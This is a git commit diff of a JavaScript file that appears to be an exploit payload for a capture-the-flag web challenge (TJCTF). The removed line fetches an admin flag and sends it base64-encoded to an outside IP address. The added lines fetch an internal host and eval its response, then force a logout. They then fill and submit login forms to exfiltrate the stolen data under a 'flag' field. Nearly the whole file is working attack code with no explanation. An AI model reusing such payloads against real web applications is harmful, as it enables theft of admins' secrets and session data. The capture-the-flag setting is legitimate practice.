eb9530c4d639ee0677fe86191297001649ea8bfd
as3617 <46442697+as3617@users.noreply.github.com>
2020-11-16 13:14:44 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,9 @@
-fetch("https://admin_secrets.tjctf.org/admin_flag").then(x=>x.text()).then(x=>top.location.replace("http://198.13.38.185:4000/?"+btoa(x)))
+var a = fetch("http://172.77.0.3:8080/",{redirect: 'follow'}).then(x=>x.text()).then(x=>x.substring(x.indexOf('/read?id=')+9,65))
+var data = fetch("/read/"+a).then(x=>x.text()).then(x=>eval(data=x));
+location.href='/logout';
+document.forms[0][1].value="aaaaaaaa";
+document.forms[0][0].value="aaaaaaaa";
+document.forms[0].submit();
+document.forms[0][0].value='flag';
+document.forms[0][1].value=btoa(data);
+document.forms[0].submit();
